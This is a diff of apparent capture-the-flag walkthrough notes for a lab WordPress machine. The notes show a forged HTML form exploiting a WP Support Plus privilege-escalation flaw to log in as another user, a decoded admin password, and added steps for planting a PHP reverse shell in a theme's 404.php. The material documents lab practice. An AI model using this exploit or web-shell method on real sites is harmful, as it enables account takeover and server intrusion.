@@ -104,13 +104,11 @@ WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Esca
     <input type="hidden" name="email" value="aarti@gmail.com">
     <input type="hidden" name="action" value="loginGuestFacebook">
     <input type="submit" value="Login">
-
-
 </form>
 
 //after click the submit, we have login as aarti
-//it seems it is an admin account
-//duder http://192.168.56.123/wordpress/wp-admin/profile.php
+//it is aarti's account
+// switch to http://192.168.56.123/wordpress/wp-admin/profile.php, on the profile page,
 
 Second Flag: 5DD1CC591CE1569A528E3BCF18CEEB5B
 
@@ -118,6 +116,10 @@ RootPassword: SWduaXRlQDEyMw==
 
 ➜  ~ echo SWduaXRlQDEyMw== | base64 -d
 Ignite@123
+//this is the admin passwd of wp application
+//login as admin, we can edit the template page, I tried the theme 'twentyseventeen, 404.php
+// a php reverse page is wrote there.
+//listening on my host:::
 
 $ pwd
 /home/raj
